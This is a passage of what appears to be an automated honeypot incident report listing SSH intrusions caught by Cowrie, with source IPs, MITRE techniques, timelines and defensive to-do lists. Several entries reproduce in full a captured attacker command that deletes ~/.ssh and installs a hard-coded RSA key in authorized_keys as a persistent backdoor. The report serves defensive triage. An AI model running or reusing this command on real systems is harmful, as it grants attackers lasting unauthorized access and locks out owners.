| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:22:10` | `cowrie.session.connect` |
| `2026-05-01 22:22:10` | `cowrie.client.version` |
| `2026-05-01 22:22:10` | `cowrie.client.kex` |
| `2026-05-01 22:22:12` | `cowrie.login.success` |
| `2026-05-01 22:22:12` | `cowrie.session.params` |
| `2026-05-01 22:22:12` | `cowrie.command.input` |
| `2026-05-01 22:22:12` | `cowrie.command.failed` |
| `2026-05-01 22:22:13` | `cowrie.log.closed` |
| `2026-05-01 22:22:13` | `cowrie.session.params` |
| `2026-05-01 22:22:13` | `cowrie.command.input` |
| `2026-05-01 22:22:13` | `cowrie.session.file_download` |
| `2026-05-01 22:22:13` | `cowrie.log.closed` |
| `2026-05-01 22:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62e8e90079c2

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:22 |
| **Last Seen** | 2026-05-01 22:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:22:17` | `cowrie.session.connect` |
| `2026-05-01 22:22:17` | `cowrie.client.version` |
| `2026-05-01 22:22:17` | `cowrie.client.kex` |
| `2026-05-01 22:22:18` | `cowrie.login.success` |
| `2026-05-01 22:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56df7052e493

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:23 |
| **Last Seen** | 2026-05-01 22:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:23:22` | `cowrie.session.connect` |
| `2026-05-01 22:23:22` | `cowrie.client.version` |
| `2026-05-01 22:23:22` | `cowrie.client.kex` |
| `2026-05-01 22:23:23` | `cowrie.login.success` |
| `2026-05-01 22:23:24` | `cowrie.session.params` |
| `2026-05-01 22:23:24` | `cowrie.command.input` |
| `2026-05-01 22:23:24` | `cowrie.command.failed` |
| `2026-05-01 22:23:24` | `cowrie.log.closed` |
| `2026-05-01 22:23:25` | `cowrie.session.params` |
| `2026-05-01 22:23:25` | `cowrie.command.input` |
| `2026-05-01 22:23:25` | `cowrie.session.file_download` |
| `2026-05-01 22:23:25` | `cowrie.log.closed` |
| `2026-05-01 22:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d906ab81005

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]45` |
| **First Seen** | 2026-05-01 22:23 |
| **Last Seen** | 2026-05-01 22:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:23:28` | `cowrie.session.connect` |
| `2026-05-01 22:23:28` | `cowrie.client.version` |
| `2026-05-01 22:23:29` | `cowrie.client.kex` |
| `2026-05-01 22:23:30` | `cowrie.login.success` |
| `2026-05-01 22:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]45` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a19336463900

| Field | Detail |
|---|---|
| **Source IP** | `106.13.144[.]200` |
| **First Seen** | 2026-05-01 22:23 |
| **Last Seen** | 2026-05-01 22:24 |
| **Session Duration** | 60s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:23:49` | `cowrie.session.connect` |
| `2026-05-01 22:23:49` | `cowrie.client.version` |
| `2026-05-01 22:24:16` | `cowrie.client.kex` |
| `2026-05-01 22:24:33` | `cowrie.login.success` |
| `2026-05-01 22:24:49` | `cowrie.session.params` |
| `2026-05-01 22:24:49` | `cowrie.command.input` |
| `2026-05-01 22:24:49` | `cowrie.log.closed` |
| `2026-05-01 22:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.144[.]200` to AbuseIPDB if not already reported
- [ ] Block `106.13.144[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f049f36a55b5

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]105` |
| **First Seen** | 2026-05-01 22:24 |
| **Last Seen** | 2026-05-01 22:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:24:32` | `cowrie.session.connect` |
| `2026-05-01 22:24:32` | `cowrie.client.version` |
| `2026-05-01 22:24:32` | `cowrie.client.kex` |
| `2026-05-01 22:24:33` | `cowrie.login.success` |
| `2026-05-01 22:24:34` | `cowrie.session.params` |
| `2026-05-01 22:24:34` | `cowrie.command.input` |
| `2026-05-01 22:24:34` | `cowrie.command.failed` |
| `2026-05-01 22:24:34` | `cowrie.log.closed` |
| `2026-05-01 22:24:35` | `cowrie.session.params` |
| `2026-05-01 22:24:35` | `cowrie.command.input` |
| `2026-05-01 22:24:35` | `cowrie.session.file_download` |
| `2026-05-01 22:24:35` | `cowrie.log.closed` |
| `2026-05-01 22:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]105` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68aca4dca5c4

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:24 |
| **Last Seen** | 2026-05-01 22:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:24:39` | `cowrie.session.connect` |
| `2026-05-01 22:24:39` | `cowrie.client.version` |
| `2026-05-01 22:24:39` | `cowrie.client.kex` |
| `2026-05-01 22:24:40` | `cowrie.login.success` |
| `2026-05-01 22:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a56b284c4797

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:25 |
| **Last Seen** | 2026-05-01 22:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:25:42` | `cowrie.session.connect` |
| `2026-05-01 22:25:42` | `cowrie.client.version` |
| `2026-05-01 22:25:42` | `cowrie.client.kex` |
| `2026-05-01 22:25:43` | `cowrie.login.success` |
| `2026-05-01 22:25:44` | `cowrie.session.params` |
| `2026-05-01 22:25:44` | `cowrie.command.input` |
| `2026-05-01 22:25:44` | `cowrie.command.failed` |
| `2026-05-01 22:25:44` | `cowrie.log.closed` |
| `2026-05-01 22:25:45` | `cowrie.session.params` |
| `2026-05-01 22:25:45` | `cowrie.command.input` |
| `2026-05-01 22:25:45` | `cowrie.session.file_download` |
| `2026-05-01 22:25:45` | `cowrie.log.closed` |
| `2026-05-01 22:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3433e8aad2a4

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]58` |
| **First Seen** | 2026-05-01 22:25 |
| **Last Seen** | 2026-05-01 22:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:25:49` | `cowrie.session.connect` |
| `2026-05-01 22:25:49` | `cowrie.client.version` |
| `2026-05-01 22:25:49` | `cowrie.client.kex` |
| `2026-05-01 22:25:50` | `cowrie.login.success` |
| `2026-05-01 22:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]58` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6efc2b3e9c8c

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:29 |
| **Last Seen** | 2026-05-01 22:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:29:12` | `cowrie.session.connect` |
| `2026-05-01 22:29:12` | `cowrie.client.version` |
| `2026-05-01 22:29:12` | `cowrie.client.kex` |
| `2026-05-01 22:29:13` | `cowrie.login.success` |
| `2026-05-01 22:29:14` | `cowrie.session.params` |
| `2026-05-01 22:29:14` | `cowrie.command.input` |
| `2026-05-01 22:29:14` | `cowrie.command.failed` |
| `2026-05-01 22:29:14` | `cowrie.log.closed` |
| `2026-05-01 22:29:15` | `cowrie.session.params` |
| `2026-05-01 22:29:15` | `cowrie.command.input` |
| `2026-05-01 22:29:15` | `cowrie.session.file_download` |
| `2026-05-01 22:29:15` | `cowrie.log.closed` |
| `2026-05-01 22:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557f10497510

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:29 |
| **Last Seen** | 2026-05-01 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:29:18` | `cowrie.session.connect` |
| `2026-05-01 22:29:18` | `cowrie.client.version` |
| `2026-05-01 22:29:19` | `cowrie.client.kex` |
| `2026-05-01 22:29:20` | `cowrie.login.success` |
| `2026-05-01 22:29:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ebe181da7d

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:30 |
| **Last Seen** | 2026-05-01 22:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:30:19` | `cowrie.session.connect` |
| `2026-05-01 22:30:19` | `cowrie.client.version` |
| `2026-05-01 22:30:19` | `cowrie.client.kex` |
| `2026-05-01 22:30:21` | `cowrie.login.success` |
| `2026-05-01 22:30:21` | `cowrie.session.params` |
| `2026-05-01 22:30:21` | `cowrie.command.input` |
| `2026-05-01 22:30:21` | `cowrie.command.failed` |
| `2026-05-01 22:30:21` | `cowrie.log.closed` |
| `2026-05-01 22:30:22` | `cowrie.session.params` |
| `2026-05-01 22:30:22` | `cowrie.command.input` |
| `2026-05-01 22:30:22` | `cowrie.session.file_download` |
| `2026-05-01 22:30:22` | `cowrie.log.closed` |
| `2026-05-01 22:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aacc00555313

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:30 |
| **Last Seen** | 2026-05-01 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:30:26` | `cowrie.session.connect` |
| `2026-05-01 22:30:26` | `cowrie.client.version` |
| `2026-05-01 22:30:26` | `cowrie.client.kex` |
| `2026-05-01 22:30:27` | `cowrie.login.success` |
| `2026-05-01 22:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-767939fa69fe

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:32 |
| **Last Seen** | 2026-05-01 22:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:32:38` | `cowrie.session.connect` |
| `2026-05-01 22:32:38` | `cowrie.client.version` |
| `2026-05-01 22:32:39` | `cowrie.client.kex` |
| `2026-05-01 22:32:40` | `cowrie.login.success` |
| `2026-05-01 22:32:40` | `cowrie.session.params` |
| `2026-05-01 22:32:40` | `cowrie.command.input` |
| `2026-05-01 22:32:40` | `cowrie.command.failed` |
| `2026-05-01 22:32:41` | `cowrie.log.closed` |
| `2026-05-01 22:32:41` | `cowrie.session.params` |
| `2026-05-01 22:32:41` | `cowrie.command.input` |
| `2026-05-01 22:32:42` | `cowrie.session.file_download` |
| `2026-05-01 22:32:42` | `cowrie.log.closed` |
| `2026-05-01 22:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-961719f872ed

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:32 |
| **Last Seen** | 2026-05-01 22:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:32:45` | `cowrie.session.connect` |
| `2026-05-01 22:32:45` | `cowrie.client.version` |
| `2026-05-01 22:32:45` | `cowrie.client.kex` |
| `2026-05-01 22:32:47` | `cowrie.login.success` |
| `2026-05-01 22:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e8acf4acd0

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]31` |
| **First Seen** | 2026-05-01 22:33 |
| **Last Seen** | 2026-05-01 22:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:33:50` | `cowrie.session.connect` |
| `2026-05-01 22:33:50` | `cowrie.client.version` |
| `2026-05-01 22:33:51` | `cowrie.client.kex` |
| `2026-05-01 22:33:52` | `cowrie.login.success` |
| `2026-05-01 22:33:53` | `cowrie.session.params` |
| `2026-05-01 22:33:53` | `cowrie.command.input` |
| `2026-05-01 22:33:53` | `cowrie.command.failed` |
| `2026-05-01 22:33:53` | `cowrie.log.closed` |
| `2026-05-01 22:33:54` | `cowrie.session.params` |
| `2026-05-01 22:33:54` | `cowrie.command.input` |
| `2026-05-01 22:33:54` | `cowrie.session.file_download` |
| `2026-05-01 22:33:54` | `cowrie.log.closed` |
| `2026-05-01 22:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]31` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef24c28079a7

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:33 |
| **Last Seen** | 2026-05-01 22:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:33:57` | `cowrie.session.connect` |
| `2026-05-01 22:33:57` | `cowrie.client.version` |
| `2026-05-01 22:33:58` | `cowrie.client.kex` |
| `2026-05-01 22:33:59` | `cowrie.login.success` |
| `2026-05-01 22:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23399c2247c

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:35 |
| **Last Seen** | 2026-05-01 22:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:35:07` | `cowrie.session.connect` |
| `2026-05-01 22:35:07` | `cowrie.client.version` |
| `2026-05-01 22:35:08` | `cowrie.client.kex` |
| `2026-05-01 22:35:09` | `cowrie.login.success` |
| `2026-05-01 22:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c3fd0e7c52

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]104` |
| **First Seen** | 2026-05-01 22:36 |
| **Last Seen** | 2026-05-01 22:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
